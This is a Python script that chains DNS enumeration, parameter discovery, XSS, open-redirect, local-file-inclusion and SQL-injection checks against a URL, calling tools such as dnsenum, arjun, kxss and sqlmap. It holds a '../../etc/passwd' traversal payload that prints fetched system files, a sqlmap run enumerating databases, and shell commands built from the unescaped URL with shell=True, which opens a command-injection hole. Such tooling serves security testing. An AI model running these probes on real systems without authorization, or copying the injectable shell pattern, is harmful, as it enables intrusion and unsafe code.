import subprocess
import sys
import requests

def dns_scan(url):
	print("######################################################################")
	print("Title: DNS Scanning")
	print("######################################################################")

	# Check if URL argument is provided
	if len(sys.argv) != 2:
	    print("Usage: python script.py <URL>")
	    sys.exit(1)

	# Write URL to a file
	with open("host.txt", "w") as file:
	    file.write(sys.argv[1])

	# Fetch the content of the URL and extract the domain name
	domain_process = subprocess.Popen(["cat", "host.txt"], stdout=subprocess.PIPE)
	cut_process = subprocess.Popen(["cut", "-d", "/", "-f", "3"], stdin=domain_process.stdout, stdout=subprocess.PIPE)
	domain_process.stdout.close()
	domain, _ = cut_process.communicate()

	# Check if domain extraction was successful
	if not domain:
	    print("Failed to extract domain name from URL")
	    sys.exit(1)

	# Execute dnsenum with the extracted domain name
	print("Output: ")
	dnsenum_process = subprocess.run(["dnsenum", "--enum", domain.decode().strip()])


	print("######################################################################")
	print("Description: DNS Scan is used to discover information about DNS servers and their associated domains.")

def param_discovery(url):
	print("######################################################################")
	print("Title: Parameter Discovery")
	print("######################################################################")
	# Get the URL from command line argument
	url = sys.argv[1]

	# Execute the command to run sqlmap and save the unfiltered tags to a file
	result_1 = subprocess.run(f"arjun -u {url} | tee file.txt", shell=True, capture_output=True, text=True)
	result_2 = subprocess.run(f"grep 'Parameters found:' file.txt | tee output_2.txt", shell=True, capture_output=True, text=True)
	#result_3 = subprocess.run(f"cat output_2.txt | grep 'Payload' | tee output_3.txt", shell=True, capture_output=True, text=True)
	# Check if the unfiltered tags file contains vulnerable characters
	with open("output_2.txt", "r") as file:
		checking_params = file.read()
		if 'Parameters found' in checking_params:
			result_3 = subprocess.run(f"cat output_2.txt", shell=True, capture_output=True, text=True)
			print(f"Output: {result_3.stdout}")
		else:
			print("Output: No parameters exist")

	print("######################################################################")
	print("Description: Discovering hidden parameters is an important for finding vulnerabilities")

	result_3 = subprocess.run(f"rm output_2.txt file.txt", shell=True, capture_output=True, text=True)

def xss_scan(url):
	#Check if the URL argument is provided
	if len(sys.argv) < 2:
		print("Usage: python3 xss.py <URL>")
		sys.exit(1)

	print("######################################################################")
	print("Title: Scanning XSS Vulnerability")
	print("######################################################################")
	# Get the URL from command line argument
	url = sys.argv[1]

	# Execute the command to run kxss and save the unfiltered tags to a file
	result = subprocess.run(f"echo '{url}' | kxss | tee unfiltered_tags.txt", shell=True, capture_output=True, text=True)

	# Check if the unfiltered tags file contains vulnerable characters
	with open("unfiltered_tags.txt", "r") as file:
		unfiltered_tags = file.read()
		if '<' in unfiltered_tags and '>' in unfiltered_tags and '"' in unfiltered_tags:
			print(f"Output: This link {url} may be vulnerable to XSS")
		else:
			print("Not Vulnerabel to XSS")

def open_redirect_scan(url):
    print("######################################################################")
    print("Title: Open Redirect Scanning")
    print("######################################################################")
    response = subprocess.run(f"curl -sI {url}", shell=True, capture_output=True, text=True)

    # Extracting the status code and headers from the response
    output = response.stdout
    lines = output.splitlines()
    status_code = None
    headers = {}

    for line in lines:
        if line.startswith("HTTP/"):
            status_code = line.split()[1]
        elif ": " in line:
            key, value = line.split(": ", 1)
            headers[key] = value

    # Checking for open redirect vulnerability
    if status_code == '302' and 'Location' in headers:
        print(f"Output: Vulnerable to open redirect: {url} -> {headers['Location']}")
        print("Headers:")
        for key, value in headers.items():
            print(f"{key}: {value}")
    else:
        print(f"Output: Not vulnerable: {url}")

    print("######################################################################")
    print("Description: Open redirect is a vulnerability classified as medium severity because it helps attackers in social engineering.")

def lfi_scan(url):
	#vuln_link="http://testphp.vulnweb.com/showimage.php?file="

	print("######################################################################")
	print("Title: Local File Inclusion Scanning")
	print("######################################################################")
	# Check if the URL is provided
	base_url = sys.argv[1]
	payload = "../../etc/passwd"
	url = f"{base_url}{payload}"

	try:
	    response = requests.get(url)
	except requests.exceptions.RequestException as e:
	    print(f"An error occurred: {e}")
	    sys.exit(1)

	if response.status_code == 200:
	    print("Output: ")
	    print(response.text)
	else:
	    print(f"Output: Failed to retrieve the file. HTTP Status Code: {response.status_code}")

	print("######################################################################")
	print("Description: Local File Inclusion is a critical vulnerability that allow attackers to access sensitive files on the system")


def sqli_scan(url):
	# Check if the URL argument is provided
	if len(sys.argv) < 2:
		print("Usage: python3 sqli.py <URL>")
		sys.exit(1)

	print("######################################################################")
	print("Title: Scanning SQLi Vulnerability")
	print("######################################################################")
	# Get the URL from command line argument
	url = sys.argv[1]

	# Execute the command to run sqlmap and save the unfiltered tags to a file
	result_1 = subprocess.run(f"sqlmap -u {url} --batch --random-agent --dbs | tee output_1.txt", shell=True, capture_output=True, text=True)
	result_2 = subprocess.run(f"grep -E '(Type|Title|Payload):' output_1.txt | tee output_2.txt", shell=True, capture_output=True, text=True)
	#result_3 = subprocess.run(f"cat output_2.txt | grep 'Payload' | tee output_3.txt", shell=True, capture_output=True, text=True)
	# Check if the unfiltered tags file contains vulnerable characters
	with open("output_2.txt", "r") as file:
		checking_payloads = file.read()
		if 'Type' in checking_payloads or 'Title' in checking_payloads or 'Payload' in checking_payloads:
			print(f"Output: This link {url} vulnerable to SQLi")
		else:
			print("Output: Not Vulnerabele to SQLi")

	print("######################################################################")
	print("Description: SQL injection is a critical security vulnerability which allow attackers to retrieve sensitive data from database")

	result_3 = subprocess.run(f"rm output*.txt", shell=True, capture_output=True, text=True)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python script.py <url>")
        sys.exit(1)
    
    url = sys.argv[1]

    dns_scan(url)
    param_discovery(url)
    xss_scan(url)
    open_redirect_scan(url)
    lfi_scan(url)
    sqli_scan(url)

